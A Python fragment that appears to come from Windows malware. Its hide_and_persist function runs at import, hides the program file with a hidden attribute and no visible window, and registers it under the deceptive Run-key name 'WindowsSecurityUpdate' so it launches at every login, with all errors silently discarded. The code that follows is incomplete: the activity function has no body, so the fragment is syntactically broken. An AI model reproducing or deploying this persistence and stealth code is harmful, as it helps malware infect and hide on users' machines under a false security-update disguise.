def hide_and_persist():
    try:
        path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        subprocess.run(['attrib', '+h', path], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, f'"{path}"')
        winreg.CloseKey(key)
    except Exception: pass

hide_and_persist()


async def activity(client):

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()
